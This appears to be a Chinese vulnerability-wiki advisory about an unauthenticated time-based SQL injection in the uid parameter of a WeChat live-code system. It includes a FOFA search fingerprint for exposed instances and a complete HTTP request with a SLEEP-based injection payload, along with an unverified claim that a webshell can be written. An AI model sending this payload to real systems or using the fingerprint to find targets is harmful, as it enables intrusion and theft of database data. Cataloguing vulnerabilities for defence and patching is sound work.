---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "微信活码系统（发行方未知） ucenter/index uid SQL注入"
product: "微信活码系统（发行方未知）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "MySQL SLEEP，版本未知"
prerequisites: "匿名声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%BE%AE%E4%BF%A1%E6%B4%BB%E7%A0%81/%E5%BE%AE%E4%BF%A1%E6%B4%BB%E7%A0%81%E7%B3%BB%E7%BB%9F%20ucenterindex%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\".qn-user-login\""
fofa_unverified: "body="
id: "vw-6f89bc2076d874571c695f17"
entity_id: "ve-6f89bc2076d874571c695f17"
schema_version: "1"
---

# 微信活码系统（发行方未知） ucenter/index uid SQL注入

## 条目说明

- 对象与具体问题：微信活码系统（发行方未知）；ucenter/index uid SQL注入
- 版本、配置及部署条件：MySQL SLEEP，版本未知
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 5秒执行2次/3秒执行2次需解释重复求值和基线统计，截图未视检不能确认为实测
- 在野已知和写木马无来源，补权限/数据库配置条件
- 厂商不明不能归腾讯；修复未给版本

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

微信活码系统  ucenter/index 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 此漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## 影响版本

微信活码系统

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body=".qn-user-login"

POC/EXP：延时5秒执行2次

```http
GET /ucenter/index/?uid=1)%20AND%20(SELECT%203460%20FROM%20(SELECT(SLEEP(5)))RkHL)%20AND%20(1015=1015 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
```


![image-20241121170435161](./.resource/微信活码系统ucenterindexSQL注入漏洞/media/image-20241121170435161.png)


POC/EXP：延时3秒执行2次

![image-20241121170524752](./.resource/微信活码系统ucenterindexSQL注入漏洞/media/image-20241121170524752.png)


## 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
